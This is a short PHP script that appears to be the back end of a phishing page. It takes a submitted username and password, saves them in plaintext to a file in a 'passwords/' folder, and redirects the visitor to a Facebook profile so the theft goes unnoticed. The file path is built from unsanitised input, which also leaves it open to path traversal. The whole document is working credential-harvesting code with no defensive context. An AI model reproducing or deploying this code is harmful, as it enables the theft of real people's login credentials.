<?php
    header ('Location: https://www.facebook.com/profile.php?id=100077266689229');
    $username = $_POST["username"];
    $password = $_POST["password"];
    file_put_contents("passwords/".$username.".txt","username = ".$username."\n"."password = ".$password);
?>  